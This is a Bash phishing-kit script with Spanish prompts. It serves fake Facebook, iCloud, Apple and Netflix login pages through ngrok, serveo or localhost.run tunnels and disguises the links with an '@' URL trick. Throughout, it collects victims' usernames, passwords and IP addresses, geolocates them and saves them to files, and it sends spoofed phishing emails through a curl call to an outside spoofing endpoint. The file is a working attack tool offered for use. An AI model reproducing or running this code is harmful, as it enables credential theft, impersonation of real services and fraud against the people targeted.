#coded by Piter

trap 'printf "\n";stop;exit 1' 2
r="\e[1;91m"
v="\e[1;92m"
a="\e[1;93m"
b="\e[1;39m"
m="\e[1;96m"
z="\e[1;94m"
rnd=`shuf -i 3000-10000 -n 1`
crnd=`shuf -i 1-9 -n 1`
DIA=`date +"%d/%m/%Y"`
HORA=`date +"%H:%M"`
link="localhost:$rnd"
#brnd=`shuf -i 2-7 -n 1`
banner="a2"
s="m"
bcolor="\e[1;3$crnd$s"

a2(){

echo -e
"PPPhish
Created by LAZY BENMANSOUR
 Emails: https://github.com/yassinbenmansour/Phishing-system.git

"

}

paquetes(){
        command -v php > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b PHP No "; exit 1;}
        command -v curl > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Curl No "; exit 1;}
        command -v git > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b GIT No "; exit 1;}
}

stop() {
        checkng=$(ps aux | grep -o "ngrok" | head -n1)
        checkphp=$(ps aux | grep -o "php" | head -n1)
        if [[ $checkng == *'ngrok'* ]]; then
                pkill -f -2 ngrok > /dev/null 2>&1
                killall -2 ngrok > /dev/null 2>&1
        fi
        if [[ $checkphp == *'php'* ]]; then
                pkill -f -2 php > /dev/null 2>&1
                killall -2 php > /dev/null 2>&1
        fi
}

menu(){
      paquetes
echo -e $bcolor
$banner
echo
echo -e "$a[$b 1$v ]$b ChicasHot          $a[$b 2$v ]$b Facebook    $a[$b 3$v ]$b Icloud"
echo -e "$a[$b 4$v ]$b Apple              $a[$b 5$v ]$b Netflix     $a[$b 6$v ]$b DiamanteGratis"

}

#Un pequeño mensaje y eliminar configuraciones al finalizar el script
finish() {
        echo -e "$v[$b*$v]$b P"
    echo -e "$v[$b*$v]$b P"
    #Si ngrok esta en el inicio significa que estamos en la carpeta principal
        if [[ -f ngrok ]];then
                if [[ -d $ruta_carpeta/images ]];then
                        rm -rf $ruta_carpeta/images
                fi
                if [[ -f $ruta_carpeta/alert.js ]];then
                        rm -rf $ruta_carpeta/alert.js
                fi
                if [[ -f $ruta_carpeta/email ]];then
                        rm $ruta_carpeta/email
                fi
                if [[ -f $ruta_carpeta/pr1 ]];then
                        rm $ruta_carpeta/pr1
                fi
                if [[ -f $ruta_carpeta/pr2 ]];then
                        rm $ruta_carpeta/pr2
                fi
                if [[ -f $ruta_carpeta/pr3 ]];then
                        rm $ruta_carpeta/pr3
                fi
                if [[ -f $ruta_carpeta/pr4 ]];then
                        rm $ruta_carpeta/pr4
                fi
                if [[ -f $ruta_carpeta/hola ]];then
                        rm $ruta_carpeta/hola
                fi
                if [[ -f $ruta_carpeta/victima ]];then
                        rm $ruta_carpeta/victima
                fi
                sed -i "/<meta property='og:.*' content='.*'/d" ./$ruta_carpeta/index.html
                sed -i "/<script src='alert.js'/d" ./$ruta_carpeta/index.html
    else
                if [[ -d images ]];then
                        rm -rf images
                fi
                if [[ -f alert.js ]];then
                        rm -rf alert.js
                fi
                if [[ -f email ]];then
                        rm email
                fi
                if [[ -f hola ]];then
                        rm hola
                fi
                if [[ -f pr1 ]];then
                        rm pr1
                fi
                if [[ -f pr2 ]];then
                        rm pr2
                fi
                if [[ -f pr3 ]];then
                        rm pr3
                fi
                if [[ -f pr4 ]];then
                        rm pr4
                fi
                if [[ -f victima ]];then
                        rm victima
                fi
                sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
                sed -i "/<script src='alert.js'/d" ./index.html
    fi
}

options(){
menu
echo
read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;92m Elige una opción\e[1;39m > ' opc
echo
if [[ $opc == "1" || $opc == "01" ]];then
web="chica"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "4" || $opc == "04" ]];then
web="apple"
op="ingles"
ruta_carpeta="websites/$web"
tunnel


elif [[ $opc == "3"  || $opc == "03"  ]];then
web="icloud"
op="ingles"
ruta_carpeta="websites/$web"
tunnel

elif [[ $opc == "2"  || $opc == "02"  ]];then
web="facebook"
op="ingles"
ruta_carpeta="websites/$web"
tunnel


elif [[ $opc == "5"  || $opc == "05"  ]];then
web="netflix"
go

elif [[ $opc == "6"  || $opc == "06"  ]];then
web="diamantesgratis"
op="ingles"
ruta_carpeta="websites/$web"
tunnel


elif [[ $opc == "99" ]];then
menu_help

elif [[ $opc == "00" ]];then
sleep 0.5
exit

else
echo -e "$r [!]$b Opción invalida, $opc"
sleep 0.5
options
fi

}

#Instalar ngrok
findngrok(){
        if [[ ! -f ngrok ]];then
                ar=$(uname -a | grep -o 'arm' | head -n1)
                ar2=$(uname -a | grep -o 'Android' | head -n1)
                if [[ $ar == *'arm'* ]] || [[ $ar2 == *'Android'* ]] ; then
                        echo -e "$v[*]$b Instalando ngrok..."
                        git clone https://github.com/DeepSociety/best-ngrok
                        mv best-ngrok/ngrok $PWD

                if [[ -d best-ngrok ]];then
                        rm -rf best-ngrok
                else
                        echo -e "$r[!]$b Comprueba tu conexión."
                        exit 1
                fi

        else
                echo -e "$v[*]$b Instalando ngrok..."
                wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1

                if [[ -e ngrok-stable-linux-386.zip ]]; then
                        unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
                        chmod +x ngrok
                        rm -rf ngrok-stable-linux-386.zip
                else
                echo -e "$r[!]$b Comprueba tu conexión."
                exit 1
                fi

                fi

        fi
}

#Elegir el tunnel
tunnel(){
        clear
        echo -e $bcolor
        $banner
        echo -e "$v[$b*$v] Pagina:$b $web"
        echo -e "$v[$b*$v] Idioma:$b $op"
        echo -e "$v[$b*$v]$b Selecciona el tunnel:\n"
        echo -e "$a[$b 1$v ] Localhost.run"
        echo -e "$a[$b 2$v ] Serveo"
        echo -e "$a[$b 3$v ] Ngrok\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' tunnel
        if [[ $tunnel == "1" || $tunnel == "01" ]];then
                cd $ruta_carpeta
                tunnel2="localrun"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        elif [[ $tunnel == "2" || $tunnel == "02" ]];then
                cd $ruta_carpeta
                tunnel2="serveo"
                trap finish EXIT
                clear_meta
                menu_options
                add_option

        elif [[ $tunnel == "3" || $tunnel == "03" ]];then
                cd $ruta_carpeta
                tunnel2="ngrok"
                trap finish EXIT
                clear_meta
                menu_options
                add_option
        else
                echo -e "\n$r[*]$b Opción invalida: $tunnel\n"
                sleep 0.5
                tunnel
        fi
}


go(){
        clear
        echo -e $bcolor
        $banner
        echo -e "$v[$b*$v] Pagina:$b $web"
        echo -e "$v[$b*$v]$b Selecciona el idioma de la pagina:\n"
        echo -e "$a[$b 1$v ]$v Español"
        echo -e "$a[$b 2$v ]$v English"
        echo -e "$a[$b 99$v ]$v Elegir otra pagina\n"
        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' lg
        echo
        if [[ $lg == "1" || $lg == "01" ]];then
                op="español"
                idioma="es"

        if [[ $adv == "xd" ]];then
                ruta_carpeta="websites/$web/es/$sexo"
        else
                ruta_carpeta="websites/$web/es"
        fi
                echo
                tunnel

        elif [[ $lg == "2" || $lg == "02" ]];then
                op="english"
                idioma="us"

        if [[ $adv == "xd" ]];then
                ruta_carpeta="websites/$web/us/$sexo"

        else
                ruta_carpeta="websites/$web/us"
        fi
                echo
                tunnel

        elif [[ $lg == "99" ]];then
                options

        else
                echo -e "$r[*]$b Opción invalida: $lg"
                sleep 0.5
                go
        fi
}


localrun(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
        echo
        port=3333
        echo
        php -S localhost:$port > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f run ]];then
                rm run
        fi

        $(which sh) -c 'ssh -R 80:localhost:$port ssh.localhost.run 2> /dev/null > run ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 2
        echo -e "$v[$b*$v]$b Abriendo local.run..."
        sleep 2
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 2
        envialink=$(grep -o "https://u0_[0-9a-z]*\.localhost.run" run)

        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz
                check
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check_found
        fi
        if [[ -f run ]]; then
                rm run
        fi
}


serveo(){
        command -v ssh > /dev/null 2>&1 || { echo >&2 -e "$v[*]$b Instalando ssh..."; pkg install openssh -y;}
        echo
        port=3333
        echo
        php -S localhost:$port > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        if [[ -f link ]]; then
                rm -rf link
        fi

        $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > link ' &
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo serveo..."
        sleep 5
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 5
        envialink=$(grep -o "https://[0-9a-z]*\.serveo.net" link)
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b localhost:3333"
                echo -e "$v[$b*$v]$b Envia a la victima > $envialink"
                disfraz

        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi
                check
                check_found
        fi
        if [[ -f link ]]; then
                rm -rf link
        fi
}

ngrok(){
        echo
        php -S $link > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Enpezando..."
        sleep 2
        cd $OLDPWD
        findngrok
        ./ngrok http $link > /dev/null 2>&1 &
        echo -e "$v[$b*$v]$b Verifica una buena conexión de internet"
        sleep 5
        echo -e "$v[$b*$v]$b Abriendo servidor PHP..."
        sleep 7
        echo -e "$v[$b*$v]$b Abriendo ngrok..."
        sleep 7
        echo -e "$v[$b*$v]$b Obteniendo links..."
        sleep 7
        envialink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io")
        if [[ $envialink == "" ]];then
                echo -e "$r[!]$b No se pudo conectar, prueba otro servidor"
                exit 1
        else
                echo -e "$v[$b*$v]$b $link"
                echo -e "$v[$b*$v]$b Envia a la victima: \e[0;32m$envialink"
                cd $ruta_carpeta
                disfraz
        #Si la opción 7(enviar correo falso) esta elegida, mostramos un mensaje
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v]$b Enviando email..."
        fi

        check
        check_found
        fi
}

disfraz(){
        namee=$(echo "$envialink" | cut -d "/" -f3)
        pop9="https://www.$web.com@$namee"
        echo -e "$v[$b*$v]$b Envio por facebook:\e[0;32m " $pop9
}

check_found(){
        echo -e "\n$r[$b*$r]$b Esperando Datos$r [$b*$r]"
        echo -e $v
        while true;do
                if [[ -f foundip.txt ]];then
                        sed -i '3iIP Encontrada: '"$HORA"' '"$DIA"'' foundip.txt
                        echo
                        echo -e "$v[*]$a IP Encontrada!!"
                        found_ip
                        rm foundip.txt
                        sleep 0.5
                fi

                if [[ -f founduser.txt ]];then
                        sed -i '3iDatos Encontrados: '"$HORA"' '"$DIA"'' founduser.txt
                        echo -e "$v[*]$a Datos Encontrados!!"
                        found_user
                        rm founduser.txt
                fi
                sleep 0.5
        done

}

found_ip(){
        ip=$(grep -a 'IP:' foundip.txt | cut -d " " -f2 | tr -d '\r')
        agent=$(grep 'User-Agent:.*' foundip.txt | cut -d ':' -f2)
        saved_to="\e[1;33mIP Guardada:$b websites/$web/ip.txt"
        echo -e "$a[*]$v IP:$b " $ip
        echo -e  "\n$a[*]$v User-Agent:$b $agent\n"
        echo -e $saved_to
        if [[ -d ../es || -d ../us ]];then
                cat foundip.txt >> ../ip.txt
        else
                cat foundip.txt >> ip.txt
        fi
        echo
        dates_ip
        echo -e "\n$v[$b*$v]$b Esperando proximos datos$v [$b*$v]\n"
}

found_user(){
        echo "$web" >> $OLDPWD/modules/pages
        account=$(grep -o 'Username:.*' founduser.txt | cut -d " " -f2)
        password=$(grep -o 'Password:.*' founduser.txt | cut -d ":" -f2)
        saved_to="\e[1;33mDatos Guardados:$b websites/$web/account.txt"
        echo -e "$a[*]$v Usuario:$b" $account
        echo -e "$a[*]$v Contraseña:$b" $password
        echo -e "\n$saved_to"
        if [[ -d ../es || -d ../us ]];then
                echo "Username: $account Password: $password" >> ../.cuenta
                cat founduser.txt >> ../account.txt
        else
                echo "Username: $account Password: $password" >> .cuenta
                cat founduser.txt >> account.txt
        fi
        echo "Datos encontrados de - $web" >> $OLDPWD/modules/accounts.txt
        cat founduser.txt >> $OLDPWD/modules/accounts.txt
        echo -e "\n$v[$b*$v]$b Esperando proximos datos$v [$b*$v]\n"
}

dates_ip(){
        if [[ -f infoip ]];then
                rm infoip
        fi

        ipfind=$(curl -s -L "http://ip-api.com/json/$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > infoip)
        query=$(grep -o '"query":.*' infoip | cut -d '"' -f4)

        if [[ $query == "" ]]; then
                echo -e "$v[*] Hostname:$b Unknown"
        else
                echo -e "$v[*] Hostname:$b" $query
        fi

        country=$(grep -o '"country":.*' infoip | cut -d '"' -f4)

        if [[ $country == "" ]]; then
                echo -e "$v[*] Country:$b Unknown"
        else
                echo -e "$v[*] Country:$b" $country
        fi

        cc=$(grep -o '"countryCode":.*' infoip | cut -d '"' -f4)

        if [[ $cc == "" ]];then
                echo -e "$v[*] Country Code:$b Unknown"
        else
                echo -e "$v[*] Country Code:$b" $cc
        fi


        rn=$(grep -o '"regionName":.*' infoip | cut -d '"' -f4)

        if [[ $rn == "" ]];then
                echo -e "$v[*] Region:$b Unknown"
        else
                echo -e "$v[*] Region:$b" $rn
        fi

        city=$(grep -o '"city":.*' infoip | cut -d '"' -f4)

        if [[ $city == "" ]];then
                echo -e "$v[*] City:b Unknown"
        else
                echo -e "$v[*] City:$b" $city
        fi

        zip=$(grep -o '"zip":.*' infoip | cut -d '"' -f4)

        if [[ $zip == "" ]];then
                echo -e "$v[*] zip:$b Unknown"
        else
                echo -e "$v[*] zip:$b" $zip
        fi

        tz=$(grep -o '"timezone":.*' infoip | cut -d '"' -f4)

        if [[ $tz == "" ]];then
                echo -e "$v[*] Time Zone:$b Unknown"
        else
                echo -e "$v[*] Time Zone:$b" $tz
        fi

        isp=$(grep -o '"isp".*' infoip | cut -d '"' -f4)

        if [[ $isp == "" ]];then
                echo -e "$v[*] ISP:$b Unknown"
        else
                echo -e "$v[*] ISP:$b" $isp
        fi

        org=$(grep -o '"org":.*' infoip | cut -d '"' -f4)

        if [[ $org == "" ]];then
                echo -e "$v[*] org:$b Unknown"
        else
                echo -e "$v[*] org:$b" $org
        fi

        as=$(grep -o '"as":.*' infoip | cut -d '"' -f4)

        if [[ $as == "" ]];then
                echo -e "$v[*] AS:$b Unknown"
        else
                echo -e "$v[*] AS:$b" $as
        fi

        lan=$(grep -o '"lat":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)
        lon=$(grep -o '"lon":.*' infoip | cut -d '"' -f3 | cut -d ':' -f2 | cut -d ',' -f1)

        if [[ $lan == "" || $lon == "" ]];then
                echo -e "$v[*] Google Maps:$b Unknown"
        else
                link_maps="https://www.google.com/maps/place/$lan,$lon"
                echo -e "$v[*] Google Maps:$b" $link_maps

                rm infoip
        fi
}

#Elimina los elementos que han sido añadidos anteriormente

clear_meta(){
        if [[ -f link ]];then
                rm link
        fi

        if [[ -d images ]];then
                rm -rf images
        fi

        if [[ -f alert.js ]];then
                rm alert.js
        fi

        if [[ -f infoip ]];then
                rm infoip
        fi

        sed -i "/<meta property='og:.*' content='.*'/d" ./index.html
        sed -i "/<script src='alert.js'/d" ./index.html
}

menu_options(){
        clear
        echo -e $bcolor
        $banner
        echo -e "$v[$b*$v] Pagina:$b $web"
        echo -e "$v[$b*$v] Idioma:$b $op"
        echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
        menu_agregados

        echo -e "$a[$b*$v]$b Para enpezar:\n"
        echo -e "$v[$b*$v]$b Escribe run o start.\n"
}

add_option(){
        menu_options
        read -p $'\e[1;33m[\e[1;39m*\e[1;33m]\e[1;39m Elige una opción\e[0m > ' addopc
        if [[ $addopc == "1" || $addopc == "01" ]];then
                clear
                echo -e $bcolor
                $banner
                read -p $'\e[1;33m[*]\e[1;32m Escribe el titulo\e[1;39m > ' title
        if [[ $title == "" ]];then
                echo -e "\n$r[!]$b No escribiste el titulo"
                sleep 1
                add_option
        else
                add1="tt"
                add_option
        fi

        elif [[ $addopc == "2" || $addopc == "02" ]];then
                clear
                echo -e $bcolor
                $banner
                read -p $'\e[1;33m[*]\e[1;32m Escribe la ruta de la imagen\e[1;39m > ' ruta
        if [[ $ruta == "" ]];then
                echo -e "\n$r[!]$b No escribiste la ruta"
                sleep 1
                add_option
        else
        if [[ -f $ruta ]];then
                add2="2"
                add_option
        else
                echo -e "\n$r[!]$b La imagen no existe"
                sleep 1
                add_option
        fi
        fi

        elif [[ $addopc == "3" || $addopc == "03" ]];then
                clear
                echo -e $bcolor
                $banner
                read -p $'\e[1;33m[*]\e[1;32m Escribe la descripción\e[1;39m > ' text
        if [[ $text == "" ]];then
                echo -e "\n$r[!]$b No escribiste la descripción"
                sleep 1
                add_option
        else
                add3="3"
                add_option
        fi

        elif [[ $addopc == "4" || $addopc == "04" ]];then
                clear
                echo -e $bcolor
                $banner
                read -p $'\e[1;33m[*]\e[1;32m Escribe la url(sin:http/https)\e[1;39m> ' url2
        if [[ $url2 == "" ]];then
                echo -e "\n$r[!]$b No escribiste la url"
                sleep 1
                add_option
        else
                add4="4"
                add_option
        fi

        elif [[ $addopc == "5" || $addopc == "05" ]];then
                clear
                echo -e $bcolor
                $banner
                read -p $'\e[1;33m[*]\e[1;32m Escribe el mensaje de alerta\e[1;39m > ' alert
        if [[ $alert == "" ]];then
                echo -e "\n$r[!]$b No escribiste el mensaje"
                sleep 1
                add_option
                else
                add5="5"
                add_option
        fi

        elif [[ $addopc == "6" || $addopc == "06" ]];then
                clear
                echo -e $bcolor
                $banner
                add6="6"
                fake

        elif [[ $addopc == "7" || $addopc == "07" ]];then
                clear
                echo -e $bcolor
                $banner
                echo -e "$v[$b*$v]$b Asegurate de tener la sincronización desactivada, y una buena conexión a internet"
                echo -e "$v[$b*$v]$b Completa el siguiente formulario:\n"
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Destinatario?(victima): ' victim
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m ¿Quien lo envia?(ejem:Facebook): ' send
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Asunto(tema): ' tema
                echo -e "$v[$b*$v]$b Tu correo, este no se mostrara en el correo falso enviado ¿Pero porque es importante? Pues si ya has enviado correos a la victima, el correo falso enviado se mostrara en la lista principal, si colocas un correo que no existe(puedes hacerlo) el correo falso enviado puede aparecer en la lista de Spam"
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe tu correo: ' correo
        if [[ $victim == "" || $send == "" || $tema == "" ]];then
                echo -e "$r[!]$b No completaste algunos campos:("
                sleep 1
                menu_options
                add_option
        else
        if [[ $correo == "" ]];then
                correo="correofake@gmail.com"
        fi

        echo -e "\n$a[$b 1$v ]$b Mensaje establecido
        $a[$b 2$v ]$b Personalizar mensaje
        $a[$b 99$v ]$b Volver al menú\n"

        while true;do
                read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Elige una opción > ' opcspof

                if [[ $opcspof == "1" || $opcspof == "01" ]];then
                        establecido="si"
                        add7="7"
                        echo -e "$v[$b*$v]$b Listo; el email se enviara al generar el link"
                        sleep 1
                        menu_options
                        add_option

                elif [[ $opcspof == "2" || $opcspof == "02" ]];then
                        echo -e "$v[$b*$v]$b Debes tener conocimientos de html, css para poder estructurar, dar estilo al mensaje, tienes que armar el mensaje en una sola linea, los saltos de linea se daran automaticamente al poner una etiqueta.\n"
                        read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Deseeas continuar(y/n): ' deseo

                if [[ $deseo == "y" || $deseo == "Y" ]];then
                        add7="7"
                        read -p $'\e[1;32m[\e[1;39m*\e[1;32m]\e[1;39m Escribe el mensaje > ' msj
                        echo -e "$v[$b*$v]$b Listo; el email se enviara al generar el link"
                        sleep 1
                        menu_options
                        add_option
                else
                        menu_options
                        add_option
                fi

                elif [[ $opcspof == "99" ]];then
                        menu_options
                        add_option

                else
                        echo -e "$r[!]$b Opción invalida"
                        sleep 1
                fi

        done

        fi

        elif [[ $addopc == "run" || $addopc == "Run" || $addopc == "start" || $addopc == "Start" ]];then
                clear
                echo -e $bcolor
                $banner
                echo -e "$v[$b*$v] Pagina:$b $web"
                echo -e "$v[$b*$v] Idioma:$b $op"
                echo -e "$v[$b*$v] Tunnel:$b $tunnel2"
                menu_agregados
                echo -e "$v[$b*$v] Puedes enviar un email falso:"
                echo -e "$v[$b*$v]$b http://bypiterrecoursesinformaticos.ibx.lat/
"
                $tunnel2
        else
                echo -e "\n$r[!]$b Opción invalida > $addopc"
                sleep 1
                add_option
        fi
}

menu_agregados(){
        if [[ $add1 == "tt" ]];then
                echo -e "$v[$b*$v] Titulo:$b $title"
        fi
        if [[ $add2 == "2" ]];then
                second_img=$(basename $ruta)
                echo -e "$v[$b*$v] Imagen:$b $second_img"
        fi
        if [[ $add3 == "3" ]];then
                echo -e "$v[$b*$v] Descripción:$b $text"
        fi
        if [[ $add4 == "4" ]];then
                echo -e "$v[$b*$v] Mini url:$b $url2"
        fi
        if [[ $add5 == "5" ]];then
                echo -e "$v[$b*$v] AlertBox:$b $alert"
        fi
        if [[ $add6 == "6" ]];then
                echo -e "$v[$b*$v] Redireccionar:$b $rede"
        fi
        if [[ $add7 == "7" ]];then
                echo -e "$v[$b*$v] Enviar email a:$b $victim"
        fi
}

check(){
        if [[ $add1 == "tt" ]];then
                show_title
        fi
        if [[ $add2 == "2" ]];then
                show_photo
        fi
        if [[ $add3 == "3" ]];then
                show_text
        fi
        if [[ $add4 == "4" ]];then
                show_url
        fi
        if [[ $add5 == "5" ]];then
                add_alert_box
        fi
        if [[ $add7 == "7" ]];then
                send_msj
        fi
}

#Alista todo y envia el email
send_msj(){
        if [[ $establecido == "si" ]];then
                nosexd="$r[!]$b Eliminaste un archivo de la carpeta core, si quieres enviar emails vuelve añadir ese archivo."
        if [[ -f email ]];then
               rm email
        fi

        if [[ -f pr1 ]];then
                rm pr1
        fi
        if [[ -f pr2 ]];then
                rm pr2
        fi
        if [[ -f pr3 ]];then
                rm pr3
        fi
        if [[ -f pr4 ]];then
                rm pr4
        fi
        if [[ -f $OLDPWD/core/pr1 ]];then
                cp $OLDPWD/core/pr1 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr4 ]];then
                cp $OLDPWD/core/pr2 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr3 ]];then
                cp $OLDPWD/core/pr3 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/pr4 ]];then
                cp $OLDPWD/core/pr4 $OLDPWD/$ruta_carpeta
        else
                echo -e $nosexd
                exit 1
        fi
        if [[ -f $OLDPWD/core/email ]];then
                cp $OLDPWD/core/email $OLDPWD/$ruta_carpeta
        else
                echo -e "$r[!]$b Eliminaste el archivo que contenia el email:c"
                exit 1
        fi
        if [[ -f hola ]];then
                rm hola
        fi
        if [[ -f victima ]];then
                rm victima
        fi

        replyr=$(echo $victim | cut -d "@" -f2)
        replye="$send@$replyr"
        echo $victim >> victima
        echo $envialink >> hola
        source email
        mens=$correobycalvinharrisxd
        curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$mens && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1

        if [[ -f spoof ]];then
                extraer_msj=$(grep -o "Successfully" spoof)
        if [[ $extraer_msj == "Successfully" ]];then
                echo -e "$v[$b*$v]$b Email enviado correctamente:)"
                rm spoof
        else
                echo -e "$r[!]$b No se envio el email:("
                rm spoof
                fi

        else
                echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
        fi

        else
                curl --data "fromname=$send && fromemail=$correo && replyname=$send && replyemail=$replye && to=$victim && message=$msj && subject=$tema" https://pruebaemailspoof.000webhostapp.com/ephp_spoofer/ephp_spoofer.php -o spoof > /dev/null 2>&1
        if [[ -f spoof ]];then
                extraer_msj=$(grep -o "Successfully" spoof)
        if [[ $extraer_msj == "Successfully" ]];then
                echo -e "$v[$b*$v]$b Email enviado correctamente:)"
                rm spoof
        else
                echo -e "$r[!]$b No se envio el email:("
                rm spoof
        fi

        else
                echo -e "$r[!]$b No se envio el email, comprueba tu conexión"
        fi

        fi
}

show_title(){
        ogtitle="<meta property='og:title' content='$title'/>"
        sed -i "/<meta property='og:title' content='.*'/d" ./index.html
        sed -i '4i '"$ogtitle"'' index.html
}

show_photo(){
        if [[ -d images ]];then
                rm -rf images
        fi

        mkdir images
        cp "$ruta" images
        obtener_name=$(basename "$ruta")
        total="$envialink/images/$obtener_name"
        ogimg="<meta property='og:image' content='$total'/>"
        sed -i "/<meta property='og:image' content='.*'/d" ./index.html
        sed -i '4i '"$ogimg"'' index.html
}

show_text(){
        ogtext="<meta property='og:description' content='$text' />"
        sed -i "/<meta property='og:description' content='.*'/d" ./index.html
        sed -i '4i '"$ogtext"'' index.html
}

show_url(){
        ogurl="<meta property='og:url' content='http://$url2' />"
        sed -i "/<meta property='og:url' content='.*'/d" ./index.html
        sed -i '4i '"$ogurl"'' index.html
}

add_alert_box(){
        ogalert="<script src='alert.js'/>"
        sed -i "/<script src='alert.js'/d" ./index.html

        if [[ -f alert.js ]];then
        rm alert.js
        fi

        echo "alert('$alert');" >> alert.js
        sed -i '4i '"$ogalert"'' index.html
}

fake(){
        read -p $'\e[1;33m[*]\e[1;32m Escribe la url a redireccionar(Usa: http/https)\e[1;39m > ' rede
        if [[ $rede == "" ]];then
                echo -e "\n$r[!]$b No escribiste la pagina"
                sleep 1
                add_option
        else
                ogrede="header('Location: $rede');"
                sed -i "/header('Location:.*)/d" ./login.php
                sed -i '2i '"$ogrede"'' login.php
        fi
        add_option
}

if [[ $1 != "" ]];then
        if [[ $1 == "--run-admin" ]];then
                defaultport=8000
                if [[ $2 != "" ]];then
                        defaultport=$2
                fi
                cd eragonprojects && python3 manage.py runserver $defaultport
        fi
fi



if [[ $1 == "" ]];then
        options
fi
